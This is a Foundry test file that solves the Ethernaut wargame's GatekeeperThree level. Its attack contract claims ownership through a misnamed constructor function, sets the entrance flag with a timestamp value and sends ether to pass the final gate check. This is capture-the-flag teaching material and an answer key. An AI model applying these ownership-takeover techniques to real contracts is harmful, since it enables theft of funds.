// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/Ethernaut.sol";
import "../src/levels/28-GatekeeperThree/SimpleTrick.sol";
import "../src/levels/28-GatekeeperThree/GatekeeperThree.sol";
import "../src/levels/28-GatekeeperThree/GatekeeperThreeFactory.sol";

// Note: run the test with attacker as tx.origin i.e. --sender 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
contract GatekeeperThreeTest is Test, BaseTest {
    GatekeeperThree public level;

    constructor() {
        levelFactory = new GatekeeperThreeFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(this._createLevelInstance());
        level = GatekeeperThree(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() public override {
        vm.startPrank(attacker);

        GatekeeperThreeAttack attack = new GatekeeperThreeAttack(levelAddr);
        attack.attack{value: 0.0011 ether}();

        vm.stopPrank();
    }
}

contract GatekeeperThreeAttack {
    GatekeeperThree public level;

    constructor(address payable _levelAddr) {
        level = GatekeeperThree(_levelAddr);
    }

    function attack() public payable {
        // 1. Initiate gatekeeper by calling wrongly declared constructor
        level.construct0r();

        // 2. Create trick contract
        level.createTrick();

        // 3. Call getAllowance() to set allow_entrance to true
        level.getAllowance(block.timestamp);

        // 4. Send 0.0011 ether to contract to pass gateThree
        (bool success, ) = address(level).call{value: 0.0011 ether}("");
        require(success, "Failed to send ether");

        level.enter();
    }
}
